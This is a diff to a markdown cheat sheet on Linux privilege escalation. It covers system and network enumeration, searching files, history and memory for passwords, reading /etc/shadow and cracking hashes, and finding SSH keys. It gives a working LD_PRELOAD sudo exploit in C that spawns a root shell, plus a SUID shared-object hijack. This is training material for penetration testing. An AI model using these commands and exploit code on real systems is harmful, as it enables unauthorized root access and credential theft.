@@ -15,7 +15,7 @@ a list of many resource to learn how privilege escalation in Linux system
 - [Looting for passwords](#looting-for-passwords)
 - [SUDO](#sudo)
 - [SUID](#suid)
-
+- [Environment Variables](#environment-variable)
 - [ETC](#etc)
 
 # cheatsheets
@@ -37,12 +37,12 @@ a list of many resource to learn how privilege escalation in Linux system
 
 ## System enumeration
 
-for find hostname 
+find hostname 
 ```
 $ hostname 
 ```
 
-print all system information
+print system information
 include : 
  - kernel name 
  - kernel release
@@ -81,7 +81,7 @@ L2 cache:                        1 MiB
 L3 cache:                        6 MiB
 
 ```
-list all task and process of system 
+List of all tasks and processes running on the system
 ```
 $ ps aux | grep $USER
 
@@ -125,7 +125,7 @@ print list of all user in the system
 $ cat /etc/passwd 
 ```
 
-keep track many program read input from the user a line at a time
+keep track history of command line
 ```
 $ history 
 
@@ -134,13 +134,13 @@ $ cat ~/.bash_history
 
 ## Network enumeration
 
-see what is ipv4/6  address of system
+ what is ipv4/6  address of system :
 ``` 
 $ ifconfig 
 $ ip a 
 ```
 
-network route and ip address 
+network route :
 ```
 $ route 
 $ ip route 
@@ -152,7 +152,7 @@ $ arp -a
 $ ip neigh
 ```
 
-all quistion that command can tell it answare to you : 
+All the questions that this command can answer you : 
   - what port are open?
   - who i communicate with?
   - who is out there network ? 
@@ -163,17 +163,17 @@ $ netstat -ano
 
 ## password hunting
 
-search in the all file in linux system that contin PASSWORD key
+search in the all file in linux system that contin PASSWORD key:
 ```
 $ grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null 
 ```
 
-find all tools in the system that have pass key as the  file name 
+find all tools in the system that have pass key as the  file name:
 ```
 $ locate pass  | less 
 ```
 
-find id_rsa file to public and private key 
+find id_rsa file to public and private key:
 ```
 $ find / -name id_rsa 2> /dev/null 
 ```
@@ -193,54 +193,54 @@ $ find / -name id_rsa 2> /dev/null
 ## Files containing passwords
 
 ``` 
-grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
-find . -type -f -exec grep -i -I "PASSWORD" {} /dev/null \;
+$ grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+$ find . -type -f -exec grep -i -I "PASSWORD" {} /dev/null \;
 ```
 
 File that were edited in the last 10 minutes 
 ```
-find / -mmin -19 2>/dev/null | grep -Ev "^/proc"
+$ find / -mmin -19 2>/dev/null | grep -Ev "^/proc"
 ```
 
-in history command 
+in history command:
 ```
-cat .bash_history | grep -i "password"
+$ cat .bash_history | grep -i "password"
 ```
-in memory passwords 
+in memory passwords:
 ```
-strings /dev/mem -n10 | grep -i PASS
+$ strings /dev/mem -n10 | grep -i PASS
 ```
 check permision of shadow file and if you have read permision LUKY LUK so use this command and read hash password 
 ```
-cat /etc/shadow 
+$ cat /etc/shadow 
 ```
 We can crack the password using join the ripper :
 ```
-unshadow passwd shadow > unshadowd.txt
-join --rules --wordlist=/path/to/wordlist/file.txt unshadowed.txt
+$ unshadow passwd shadow > unshadowd.txt
+$ join --rules --wordlist=/path/to/wordlist/file.txt unshadowed.txt
 ```
 
 ## ssh keys 
 
 ```
-find / -name authorized_keys 2> /dev/null
-find / -name id_rsa 2> /dev/null
+$ find / -name authorized_keys 2> /dev/null
+$ find / -name id_rsa 2> /dev/null
 ```
 
 search within history strings that cnotain ssh / telnet / mysql
 ```
-grep ^ssh /home/*/.hist
-grep ^telnet /home/*/.hist
-grep ^mysql /home/*/.hist
+$ grep ^ssh /home/*/.hist
+$ grep ^telnet /home/*/.hist
+$ grep ^mysql /home/*/.hist
 ```
 
 # sudo 
 
 a command to run tools with higher(root) privilege
 
-when you execiute ``` sudo -l ``` then has return all program and environment variable that you can run without root user password.
-for example, when I run this command showing me this:
+when you execiute ``` sudo -l ``` then has return list the allowed (and forbidden) commands for the invoking user on the current host:
 ```
+$ sudo -l
 Maching Defaults entries for Amini on this host:
 	env_reset, env_keep+=LD_PRELOAD
 User Amini may run the following command on this host:
@@ -271,32 +271,34 @@ if you not find command in Gtfobins list just need think out of the box and impr
 
 LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.[more...](https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html)
 
-so how can privilege access with this?, open one Editor that loved and wirte a below C program and save it
+1. In command prompt type: ```sudo -l```
+2. From the output, notice that the ```LD_PRELOAD``` environment variable is intact.
+
+Exploitation
+
+1. Open a text editor and type:
 ```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
 
 void _init() {
-	unsetenv("LD_PRELOAD");
-	setgid(0);
-	setuid(0);
-	system("/bin/bash");
-
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
 }
 ```
-and compiled with this command :
+2. Save the file as x.c
+3. In command prompt type:
 ```
-$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+$ gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles 
 ```
-now we can exploited :
+4. In command prompt type:
 ```
-$ sudo LD_PRELOAD=/home/user/shell.so apache2
-
+$ sudo LD_PRELOAD=/tmp/x.so apache2
 ```
-after that we have root access :
-```
-$ whoami 
-root
-```
-keep going on and try to find new out of the box solution
+5. In command prompt type: id
 
 # SUID
 
@@ -348,11 +350,11 @@ save this and compile it with :
 ```
 gcc -shared -fPIC -o <repleaced file path that find> <path to program file>
 ```
-and that have root access 
+and that's it, you have root access 
 
 also, I suggest you see [ CVE-2016-1247 ](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html) nginexed bug
 
-environment variable 
+## Environment Variable 
 
 when you find some command that has suid and with ```strace ``` can't find anything after trying to find what command that executed with :
 ```
@@ -392,7 +394,7 @@ $ /path/to/example/command
 ```
 if you not see any error so that's mean successfully done
 
-
+# THIS LIST ٌWILL BE UPDATED 
 
 # ETC
 
